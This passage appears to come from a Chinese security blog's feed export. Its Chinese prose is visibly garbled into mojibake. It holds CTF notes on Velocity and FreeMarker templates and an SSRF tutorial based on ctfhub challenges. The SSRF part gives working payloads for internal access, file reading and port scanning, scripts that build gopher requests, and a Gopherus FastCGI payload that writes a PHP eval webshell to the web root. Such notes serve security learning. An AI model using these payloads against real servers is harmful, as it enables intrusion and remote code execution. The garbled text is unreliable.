‡è¯†ä¸€ä¸ªå˜é‡ï¼Œæ¯”å¦‚æ¨¡æ¿æ–‡ä»¶ä¸­ä¸ºHello $aï¼Œå¯ä»¥è·å–é€šè¿‡ä¸Šä¸‹æ–‡ä¼ é€’çš„$a</p><p><strong>å£°æ˜</strong></p><p>setç”¨äºå£°æ˜Velocityè„šæœ¬å˜é‡ï¼Œå˜é‡å¯ä»¥åœ¨è„šæœ¬ä¸­å£°æ˜</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set($a =&quot;velocity&quot;)</span><br><span class="line">#set($b=1)</span><br><span class="line">#set($arrayName=[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure></div><p><strong>æ³¨é‡Š</strong></p><p>å•è¡Œæ³¨é‡Šä¸º##ï¼Œå¤šè¡Œæ³¨é‡Šä¸ºæˆå¯¹å‡ºç°çš„#* â€¦â€¦â€¦â€¦. *#</p><p><strong>æ¡ä»¶è¯­å¥</strong></p><p>ä»¥if&#x2F;elseä¸ºä¾‹ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;/strong&gt;</span><br><span class="line">#elseif($foo==10)</span><br><span class="line">    &lt;strong&gt;2&lt;/strong&gt;</span><br><span class="line">#elseif($bar==6)</span><br><span class="line">    &lt;strong&gt;3&lt;/strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;/strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure></div><p> <strong>è½¬ä¹‰å­—ç¬¦</strong></p><p>å¦‚æœ$aå·²ç»è¢«å®šä¹‰ï¼Œä½†æ˜¯åˆéœ€è¦åŸæ ·è¾“å‡º$aï¼Œå¯ä»¥è¯•ç”¨\è½¬ä¹‰ä½œä¸ºå…³é”®çš„$</p><h3 id="åŸºç¡€ä½¿ç”¨"><a href="#åŸºç¡€ä½¿ç”¨" class="headerlink" title="åŸºç¡€ä½¿ç”¨"></a>åŸºç¡€ä½¿ç”¨</h3><p>&#x2F;&#x2F;å¾…è¡¥å……</p><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h2><p>FreeMarker æ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼šå³ä¸€ç§åŸºäºæ¨¡æ¿å’Œè¦æ”¹å˜çš„æ•°æ®ï¼Œ å¹¶ç”¨æ¥ç”Ÿæˆè¾“å‡ºæ–‡æœ¬(HTMLç½‘é¡µï¼Œç”µå­é‚®ä»¶ï¼Œé…ç½®æ–‡ä»¶ï¼Œæºä»£ç ç­‰)çš„é€šç”¨å·¥å…·</p><h3 id="FreeMarkeræ¨¡æ¿ä»£ç ï¼š"><a href="#FreeMarkeræ¨¡æ¿ä»£ç ï¼š" class="headerlink" title="FreeMarkeræ¨¡æ¿ä»£ç ï¼š"></a><strong>FreeMarkeræ¨¡æ¿ä»£ç </strong>ï¼š</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Welcome!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;ã€€&lt;#-è¿™æ˜¯æ³¨é‡Š-&gt;</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;Our latest product:</span><br><span class="line">  &lt;a href=&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;/a&gt;!</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><p>æ¨¡æ¿æ–‡ä»¶å­˜æ”¾åœ¨WebæœåŠ¡å™¨ä¸Šï¼Œå°±åƒé€šå¸¸å­˜æ”¾é™æ€HTMLé¡µé¢é‚£æ ·ã€‚å½“æœ‰äººæ¥è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œ FreeMarkerå°†ä¼šä»‹å…¥æ‰§è¡Œï¼Œç„¶ååŠ¨æ€è½¬æ¢æ¨¡æ¿ï¼Œç”¨æœ€æ–°çš„æ•°æ®å†…å®¹æ›¿æ¢æ¨¡æ¿ä¸­ ${â€¦} çš„éƒ¨åˆ†ï¼Œ ä¹‹åå°†ç»“æœå‘é€åˆ°è®¿é—®è€…çš„Webæµè§ˆå™¨ä¸­ã€‚</p><p>è¿™ä¸ªæ¨¡æ¿ä¸»è¦ç”¨äº java ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å®ç° TemplateModel æ¥ç”¨ new åˆ›å»ºä»»æ„ Java å¯¹è±¡</p><h3 id="ä¸»è¦"><a href="#ä¸»è¦" class="headerlink" title="ä¸»è¦"></a>ä¸»è¦</h3><p>&#x2F;&#x2F;å¾…è¡¥å……</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web.ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFå­¦ä¹ </title>
      <link href="/2022/04/01/SSRF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/01/SSRF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRFå­¦ä¹ "><a href="#SSRFå­¦ä¹ " class="headerlink" title="SSRFå­¦ä¹ "></a>SSRFå­¦ä¹ </h1><h2 id="0x01-ssrfåŸºç¡€"><a href="#0x01-ssrfåŸºç¡€" class="headerlink" title="0x01 ssrfåŸºç¡€"></a>0x01 ssrfåŸºç¡€</h2><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) </p><p>æˆå› ï¼šæœåŠ¡å™¨æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶</p><p>å½¢æˆç¯èŠ‚ï¼šå®‰å…¨çš„ç½‘ç«™åº”æ¥æ”¶è¯·æ±‚åï¼Œæ£€æµ‹è¯·æ±‚çš„åˆæ³•æ€§</p><p>æ”»å‡»ç›®æ ‡ï¼šä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œå†…ç½‘</p><h2 id="0x02-ctfhubå†…æŠ€èƒ½æ ‘"><a href="#0x02-ctfhubå†…æŠ€èƒ½æ ‘" class="headerlink" title="0x02 ctfhubå†…æŠ€èƒ½æ ‘"></a>0x02 ctfhubå†…æŠ€èƒ½æ ‘</h2><h3 id="å†…ç½‘è®¿é—®"><a href="#å†…ç½‘è®¿é—®" class="headerlink" title="å†…ç½‘è®¿é—®"></a>å†…ç½‘è®¿é—®</h3><p>ç›´æ¥åˆ©ç”¨httpåè®®è®¿é—®</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></div><p>å¦‚æœæœ‰å¯¹å†…ç½‘IPè¿›è¡Œæ£€æµ‹ï¼Œå¯ä»¥ç”¨<code>åœ°å€è§£æ</code>ç»•è¿‡</p><p>curl()å‡½æ•°è§£æçš„æ˜¯ç¬¬ä¸€ä¸ª@åé¢çš„ç½‘å€ï¼Œè€Œparse_url()å‡½æ•°è§£æçš„æ˜¯ç¬¬äºŒä¸ª@åé¢çš„ç½‘å€ã€‚</p><p>url_parseä¼šè§£ææˆbaidu.com</p><p>è€Œcurlä¼šè¯·æ±‚127.0.0.1</p><p>é«˜ç‰ˆæœ¬ä¸­çš„PHPä¸­ä¿®å¤äº†ä½†æ˜¯å¯ä»¥åŠ ç«¯å£å·ç»•è¿‡</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§æ„é€ payload</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://abc@127.0.0.1:80@example.com/flag.php </span><br></pre></td></tr></table></figure></div><p>åœ¨check_inner_ipå‡½æ•°å†…è®¤ä¸ºhostnameæ˜¯example.comï¼Œä½†curlè¯·æ±‚127.0.0.1:80&#x2F;flag.phpï¼ŒæˆåŠŸè·å–flag</p><h3 id="ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>ä¼ªåè®®è¯»å–æ–‡ä»¶</h3><p>PHPæ”¯æŒçš„ä¼ªåè®®</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http:// â€” è®¿é—® HTTP(s) ç½‘å€</span><br><span class="line">ftp:// â€” è®¿é—® FTP(s) </span><br><span class="line">URLsphp:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span><br><span class="line">zlib:// â€” å‹ç¼©æµ</span><br><span class="line">data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span><br><span class="line">glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">phar:// â€” PHP å½’æ¡£</span><br><span class="line">ssh2:// â€” Secure Shell 2rar:// â€” RARogg:// â€” éŸ³é¢‘æµexpect:// â€” å¤„ç†äº¤äº’å¼çš„æµ</span><br><span class="line">php://filter:filterè¿‡æ»¤æµ</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></div><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>åœ¨SSRFä¸­ï¼Œdictåè®®ä¸httpåè®®å¯ä»¥ç”¨æ¥æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»ä¸ç«¯å£å¼€æ”¾æƒ…å†µã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:8000</span><br></pre></td></tr></table></figure></div><p>ç”¨burpï¼Œåœ¨intruderä¸­ï¼Œå°†ç«¯å£è®¾ç½®ä¸ºå˜é‡ã€‚ä½¿ç”¨Simple Listæ‰«æå¸¸ç”¨ç«¯å£ï¼Œæˆ–è€…ä½¿ç”¨NumerListè¿›è¡Œæšä¸¾ã€‚å½“å‘ç°é•¿åº¦ä¸åŒçš„æ•°æ®åŒ…æ—¶ï¼Œå†ç”¨<code>http</code>åè®®è¿›ä¸€æ­¥æ¢æµ‹ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1:8987</span><br></pre></td></tr></table></figure></div><h3 id="å‰ç½®çŸ¥è¯†ï¼šGopheråè®®çš„åˆ©ç”¨"><a href="#å‰ç½®çŸ¥è¯†ï¼šGopheråè®®çš„åˆ©ç”¨" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼šGopheråè®®çš„åˆ©ç”¨"></a>å‰ç½®çŸ¥è¯†ï¼šGopheråè®®çš„åˆ©ç”¨</h3><p>ä»€ä¹ˆæ˜¯gopheråè®®</p><p><code>gopher</code>åè®®æ˜¯ä¸€ç§ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œä»–å°†<code>Internet</code>ä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œæ–¹ä¾¿ç”¨æˆ·ä»<code>Internet</code>çš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨<code>WWW</code>å‡ºç°ä¹‹å‰ï¼Œ<code>Gopher</code>æ˜¯<code>Internet</code>ä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨<code>tcp 70</code>ç«¯å£ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ Redisã€Mysqlã€FastCGIã€Ftpç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ GETã€POST è¯·æ±‚ã€‚è¿™æ‹“å®½äº† SSRF çš„æ”»å‡»é¢ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher åè®®çš„æ ¼å¼ï¼šgopher://IP:port/_TCP/IPæ•°æ®æµ</span><br></pre></td></tr></table></figure></div><p>gopheråè®®å‘é€http getè¯·æ±‚</p><blockquote><p>æ„é€ <code>HTTP</code>æ•°æ®åŒ…</p><p><code>URL</code>ç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º<code>%0d%0a</code>ï¼Œ<code>HTTP</code>åŒ…æœ€ååŠ <code>%0d%0a</code>ä»£è¡¨æ¶ˆæ¯ç»“æŸ</p><p>å‘é€<code>gopher</code>åè®®, åè®®åçš„<code>IP</code>ä¸€å®šè¦æ¥ç«¯å£</p></blockquote><p>å‘é€http postè¯·æ±‚</p><blockquote><p><code>POST</code>ä¸<code>GET</code>ä¼ å‚çš„åŒºåˆ«ï¼šå®ƒæœ‰<code>4</code>ä¸ªå‚æ•°ä¸ºå¿…è¦å‚æ•°</p><p>éœ€è¦ä¼ é€’<code>Content-Type</code>,<code>Content-Length</code>,<code>host</code>,<code>post</code>çš„å‚æ•°</p></blockquote><h3 id="å‘é€POSTè¯·æ±‚"><a href="#å‘é€POSTè¯·æ±‚" class="headerlink" title="å‘é€POSTè¯·æ±‚"></a>å‘é€POSTè¯·æ±‚</h3><p>åˆ©ç”¨gopheråè®®æ„é€ POSTè¯·æ±‚</p><p><code>urllib.parse</code>ç”¨äºè§£æURL</p><p><code>urllib.parse.quote()</code>å¯¹URLä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç </p><p><code>replace()</code>æ›¿æ¢å­—ç¬¦ä¸²</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=c384d200658f258e5b5c681bf0aa29a8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨æ„åé¢ä¸€å®šè¦æœ‰å›è½¦ï¼Œå›è½¦ç»“å°¾è¡¨ç¤ºhttpè¯·æ±‚ç»“æŸ</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span class="comment"># è¿™é‡Œå› ä¸ºæ˜¯GETè¯·æ±‚ä½¿ç”¨gopheråè®®ï¼Œæ‰€ä»¥è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç </span></span><br></pre></td></tr></table></figure></div><p><strong>æ³¨æ„ï¼šä¸Šé¢é‚£å››ä¸ªå‚æ•°æ˜¯POSTè¯·æ±‚å¿…é¡»çš„ï¼Œå³POSTã€Hostã€Content-Typeå’ŒContent-Lengthã€‚å¦‚æœå°‘äº†ä¼šæŠ¥é”™çš„ï¼Œè€ŒGETåˆ™ä¸ç”¨ã€‚</strong></p><p>æ³¨æ„<strong>Content-Lengthåº”ä¸ºPOSTæ•°æ®å†…å®¹çš„é•¿åº¦</strong>ï¼Œè¿™é‡Œä¸º36(å³å­—ç¬¦ä¸²â€œkey&#x3D;c384d200658f258e5b5c681bf0aa29a8â€çš„é•¿åº¦)ã€‚</p><p>å› ä¸º<code>urllib.parse.quote()</code>ä¼šå°†æ¢è¡Œç¼–ç ä¸º<code>%0A</code>ï¼Œè€Œåœ¨gopheråè®®ä¸­ï¼Œè¿›è¡ŒURLç¼–ç ï¼Œä¼šå°†å›è½¦æ¢è¡Œç¼–ç ä¸º<code>%0d%0a</code>ï¼Œæ‰€ä»¥ï¼Œç¬¬äºŒæ­¥ä½¿ç”¨<code>replace()</code>å°†<code>%0A</code>æ›¿æ¢ä¸º<code>%0D%0A</code>ã€‚æ¥ä¸‹æ¥ï¼Œæ‹¼æ¥ä¸Šgopheråè®®çš„æ ‡å‡†æ ¼å¼ï¼Œæœ€åå†ä½¿ç”¨ä¸€æ¬¡<code>urllib.parse.quote()</code>å¯¹æ–°å¢çš„éƒ¨åˆ†è¿›è¡ŒURLç¼–ç ã€‚å› ä¸ºæ–°å¢çš„éƒ¨åˆ†ä¸æ˜¯POSTæ•°æ®åŒ…çš„å†…å®¹ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸å­˜åœ¨å›è½¦æ¢è¡Œï¼Œä¹Ÿå°±ä¸éœ€è¦å°†<code>%0A</code>æ›¿æ¢ä¸º<code>%0D%0A</code>ã€‚</p><p>æ ‡å‡†gopheråè®®çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Da68a3b03e80ce7fef96007dfa01dc077%250D%250A</span><br></pre></td></tr></table></figure></div><h3 id="æäº¤æ–‡ä»¶"><a href="#æäº¤æ–‡ä»¶" class="headerlink" title="æäº¤æ–‡ä»¶"></a>æäº¤æ–‡ä»¶</h3><p>é¦–å…ˆæŠ“å–ä¸€ä¸ªæ­£å¸¸æäº¤æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œç„¶åä½¿ç”¨ä¸Šè¿°è„šæœ¬å°†å…¶è½¬æ¢ä¸ºgopheråè®®çš„æ ¼å¼ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------256165401027520231274027094134</span></span><br><span class="line"><span class="string">Content-Length: 357</span></span><br><span class="line"><span class="string">Origin: http://challenge-0a06816bc1b6ad0c.sandbox.ctfhub.com:10800</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://challenge-0a06816bc1b6ad0c.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------256165401027520231274027094134</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="string">-----------------------------256165401027520231274027094134</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æäº¤æŸ¥è¯¢</span></span><br><span class="line"><span class="string">-----------------------------256165401027520231274027094134--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#æ³¨æ„åé¢ä¸€å®šè¦æœ‰å›è½¦ï¼Œå›è½¦ç»“å°¾è¡¨ç¤ºhttpè¯·æ±‚ç»“æŸ</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div><h3 id="æ”»å‡»FastCGIåè®®"><a href="#æ”»å‡»FastCGIåè®®" class="headerlink" title="æ”»å‡»FastCGIåè®®"></a>æ”»å‡»FastCGIåè®®</h3><p>ä½¿ç”¨ <a class="link"   href="https://github.com/tarunkant/Gopherus" >Gopherus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>å·¥å…·ç”Ÿæˆæ”»å‡»FastCGIçš„payload</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>libcurlç‰ˆæœ¬&gt;&#x3D;7.45.0</li><li>PHP-FPMç›‘å¬ç«¯å£</li><li>PHP-FPMç‰ˆæœ¬ &gt;&#x3D; 5.3.3</li><li>çŸ¥é“æœåŠ¡å™¨ä¸Šä»»æ„ä¸€ä¸ªphpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php                 # è¿™é‡Œè¾“å…¥çš„æ˜¯ä¸€ä¸ªå·²çŸ¥å­˜åœ¨çš„phpæ–‡ä»¶</span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1k54nnda4j210s0ouwnb.jpg"                      alt="image-20220424005333748"                ><figcaption>image-20220424005333748</figcaption></figure></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH134%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%86%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%20%7C%20base64%20-d%20%3E%20/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure></div><p>éœ€è¦å°†ç”Ÿæˆçš„payloadå†è¿›è¡Œä¸€æ¬¡urlç¼–ç </p><blockquote><p>å› ä¸ºGETä¼šè¿›è¡Œä¸€æ¬¡è§£ç ï¼Œcurlä¹Ÿä¼šè¿›è¡Œä¸€æ¬¡è§£ç </p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%2520%257C%2520base64%2520-d%2520%253E%2520%2Fvar%2Fwww%2Fhtml%2Fshell.php%2527%2529%253Bdie%2528%2527</span><br></pre></td></tr></table></figure></div><h3 id="æ”»å‡»Redisåè®®"><a href="#æ”»å‡»Redisåè®®" class="headerlink" title="æ”»å‡»Redisåè®®"></a>æ”»å‡»Redisåè®®</h3><p><a class="link"   href="https://www.freebuf.com/articles/web/249238.html" >Redisç³»åˆ—æ¼æ´æ€»ç»“ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>ä¸»è¦åˆ©ç”¨redisæœªæˆæƒè®¿é—®ï¼Œå¦‚ï¼šå†™ssh-keygenå…¬é’¥ç™»å½•ï¼Œåˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shellï¼Œç›´æ¥å†™webshellç­‰ï¼Œä¸»ä»å¤åˆ¶getshellã€‚</p><p>ç«¯å£æ‰«æåˆ°redisè¿è¡Œçš„ç«¯å£ï¼ŒæŠ¥é”™â¬‡ï¸</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 